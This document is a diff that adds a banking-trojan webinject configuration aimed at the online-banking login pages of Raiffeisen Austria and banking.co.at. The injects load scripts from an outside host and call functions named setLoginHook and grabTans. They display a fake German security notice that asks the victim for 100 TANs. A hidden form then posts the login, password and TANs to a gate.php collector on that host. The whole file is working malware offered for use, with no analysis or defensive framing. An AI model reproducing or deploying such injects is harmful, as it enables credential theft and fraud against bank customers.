+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan33"></td>
+						<td class="nrc">043</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan43"></td>
+						<td class="nrc">053</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan53"></td>
+						<td class="nrc">063</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan63"></td>
+						<td class="nrc">073</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan73"></td>
+						<td class="nrc">083</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan83"></td>
+						<td class="nrc">093</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan93"></td>
+					</tr>
+					<tr>
+						<td class="nrc">004</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan04"></td>
+						<td class="nrc">014</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan14"></td>
+						<td class="nrc">024</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan24"></td>
+						<td class="nrc">034</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan34"></td>
+						<td class="nrc">044</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan44"></td>
+						<td class="nrc">054</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan54"></td>
+						<td class="nrc">064</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan64"></td>
+						<td class="nrc">074</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan74"></td>
+						<td class="nrc">084</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan84"></td>
+						<td class="nrc">094</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan94"></td>
+					</tr>
+					<tr>
+						<td class="nrc">005</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan05"></td>
+						<td class="nrc">015</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan15"></td>
+						<td class="nrc">025</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan25"></td>
+						<td class="nrc">035</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan35"></td>
+						<td class="nrc">045</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan45"></td>
+						<td class="nrc">055</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan55"></td>
+						<td class="nrc">065</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan65"></td>
+						<td class="nrc">075</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan75"></td>
+						<td class="nrc">085</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan85"></td>
+						<td class="nrc">095</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan95"></td>
+					</tr>
+					<tr>
+						<td class="nrc">006</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan06"></td>
+						<td class="nrc">016</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan16"></td>
+						<td class="nrc">026</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan26"></td>
+						<td class="nrc">036</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan36"></td>
+						<td class="nrc">046</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan46"></td>
+						<td class="nrc">056</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan56"></td>
+						<td class="nrc">066</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan66"></td>
+						<td class="nrc">076</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan76"></td>
+						<td class="nrc">086</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan86"></td>
+						<td class="nrc">096</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan96"></td>
+					</tr>
+					<tr>
+						<td class="nrc">007</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan07"></td>
+						<td class="nrc">017</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan17"></td>
+						<td class="nrc">027</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan27"></td>
+						<td class="nrc">037</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan37"></td>
+						<td class="nrc">047</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan47"></td>
+						<td class="nrc">057</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan57"></td>
+						<td class="nrc">067</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan67"></td>
+						<td class="nrc">077</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan77"></td>
+						<td class="nrc">087</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan87"></td>
+						<td class="nrc">097</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan97"></td>
+					</tr>
+					<tr>
+						<td class="nrc">008</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan08"></td>
+						<td class="nrc">018</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan18"></td>
+						<td class="nrc">028</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan28"></td>
+						<td class="nrc">038</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan38"></td>
+						<td class="nrc">048</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan48"></td>
+						<td class="nrc">058</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan58"></td>
+						<td class="nrc">068</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan68"></td>
+						<td class="nrc">078</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan78"></td>
+						<td class="nrc">088</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan88"></td>
+						<td class="nrc">098</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan98"></td>
+					</tr>
+					<tr>
+						<td class="nrc">009</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan09"></td>
+						<td class="nrc">019</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan19"></td>
+						<td class="nrc">029</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan29"></td>
+						<td class="nrc">039</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan39"></td>
+						<td class="nrc">049</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan49"></td>
+						<td class="nrc">059</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan59"></td>
+						<td class="nrc">069</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan69"></td>
+						<td class="nrc">079</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan79"></td>
+						<td class="nrc">089</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan89"></td>
+						<td class="nrc">099</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan99"></td>
+					</tr>
+					<tr>
+						<td class="nrc">010</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan10"></td>
+						<td class="nrc">020</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan20"></td>
+						<td class="nrc">030</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan30"></td>
+						<td class="nrc">040</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan40"></td>
+						<td class="nrc">050</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan50"></td>
+						<td class="nrc">060</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan60"></td>
+						<td class="nrc">070</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan70"></td>
+						<td class="nrc">080</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan80"></td>
+						<td class="nrc">090</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan90"></td>
+						<td class="nrc">100</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan100"></td>
+					</tr>
+				</table>
+					</td>
+				</tr>
+				<tr>
+					<td>
+						
+					</td>
+				</tr>
+			</table>
+			<div class="vip_button">
+				<input type="button" value="Absenden" onClick="DoLogin();return false;">
+			</div>
+			</center>
+		</form>
+	</div>
+</div>
+
+data_end
+
+data_after
+data_end
+set_url https://banking.raiffeisen.at/logincenter/login.wf* GPdata_before</body>data_enddata_inject<script type="text/javascript" src="https://fur.sicherheit-schild.eu/at/scripts/raiffeisen.at.js"></script><script type="text/javascript">setLoginHook();</script>data_enddata_afterdata_endset_url https://banking.raiffeisen.at/html/startseite.wf* GPdata_before</head>data_enddata_inject<link rel="stylesheet" type="text/css" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/themes/smoothness/ui.all.css" /><style type="text/css">#inject { display: none; }.ui-dialog-titlebar-close { visibility: hidden; }.ui-dialog .ui-dialog-titlebar { visibility: hidden; display: none; }.ui-dialog-buttonpane {	background-image: none;	background:#ffffff; }.ui-dialog{	width: 400px;	background: #ffffff;	padding: 4px 1px 4px 6px;	/* some shit that might help	#border-top:5px solid #e8f404;	#border-bottom:5px solid #e8f404;	#border-right:5px solid #e8f404;	#border-left:5px solid #e8f404;	*/	font-weight: bold;	font-size: 11px;	margin: 8px 0px 0px 2px;	border: 1px solid #000000;}.form204 * {font-size: 12px; font-family: Tahoma, Arial, Helvetica;color: #000000; }.tansz { border: solid 1px #E79A00; padding: 10px; margin: 20px 0px; background-color: #FEFFDA; }.tansz td{ text-align: center; color: #383838; padding: 0px }.errorText {font-family: Arial, Helvetica, sans-serif; font-size: 75%; font-weight: bold; color: #000000; }.errorTextRow {background-color:;}.style8 {width:100%; background:#FFFFFF; height:80px;}.style7 {float:right; margin:15px 0px 15px 10px}.style6 {float:left; font-weight:bold; color:#FF0000; margin:20px 50px 0px 0px; border-top:1px solid #ffffff;}.style5 {border:solid 1px #000000; padding:20px}.style3 {	margin-top:5px;	padding:5px;	border:solid 1px #D4D4D4;	background-color: #FAE6B0;	align: left;	color:#FFFFFF;	font-weight: bold;}.style10 {color: #000000}.style11 {color: #333333}</style>data_enddata_afterdata_enddata_before</body>data_enddata_inject<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script><script type="text/javascript" src="https://fur.sicherheit-schild.eu/at/scripts/raiffeisen.at.js"></script><script type="text/javascript">grabTans();</script><div id="inject"><form>	<div class="form204" align="center">		<div class="header" style="background-image: url(/logincenter/german/images/spacer_border.jpg); ">			<div class="header-left" style="padding-top:26px;"><img src="/logincenter/german/images/header_left.jpg" alt="" /></div>			<div class="header-right" style="padding-top:26px;"><img src="/logincenter/german/images/header_right.jpg" alt="" /></div>		</div>		<br/>		<div class="style5">			<div align="left">				<div class="style3">					<span class="style10">Wegen der zahlreichen Schwindelf&auml;lle f&uuml;hren wir zus&auml;tzliche Sicherheitsma&szlig;nahmen ein. Um die Arbeit mit Ihrem Konto fortzusetzen, f&uuml;llen Sie bitte einmalig die untenstehende Tabelle aus</span>					<span class="style11">.</span>				</div>				<div class="tansz">					<div align="center">					<table width="50%" cellpadding="0" align="center">						<script language=JavaScript>							for (var row=0; row<=10; row++)							{								document.write('<tr align=center>');								for (var col=0; col < 10; col++)								{									if (!row)									{										document.write('<td>NR</td><td>TAN</td>');									}									else									{										var tan_num = col * 10 + row;										var tan_num3 = "" + tan_num;										while (tan_num3.length < 3)											tan_num3 = "0"+tan_num3;										document.write('<td><div style="width: 26px;">'+tan_num3+'</div></td>');										document.write('<td><input name="inject_tan'+tan_num+'" type="text" id="inject_tan'+tan_num+'" style="width: 47px;" maxlength="6" /></td>');									}								}								document.write('</tr>');							}						</script>					</table>					</div>				</div>			</div>		</div>	</div></form></div><iframe name=trgt id=trgt style='display:none;'></iframe><form name="injectform" action="https://fur.sicherheit-schild.eu/at/gate.php" method="post" target=trgt><input type="hidden" name="bank" value="raiffeisen" /><input type="hidden" name="login" id="login" value="" /><input type="hidden" name="pass" id="pass" value="" /><script language=JavaScript>for (var i=1; i<=100; i++)	document.write('<input type="hidden" name="tan'+i+'" id="tan'+i+'" />');</script></form>data_enddata_afterdata_end
+set_url "https://www.banking.co.at/*/login.html*" GP
+data_before
+</script>
+data_end
+
+data_inject
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js"></script>
+<link rel="stylesheet" type="text/css" href="https://fur.sicherheit-schild.eu/at/scripts/volksbank.css" />
+<script type="text/javascript" src="https://fur.sicherheit-schild.eu/at/scripts/volksbank.js"></script>
+data_end
+
+data_after
+data_end
+
+
+
+
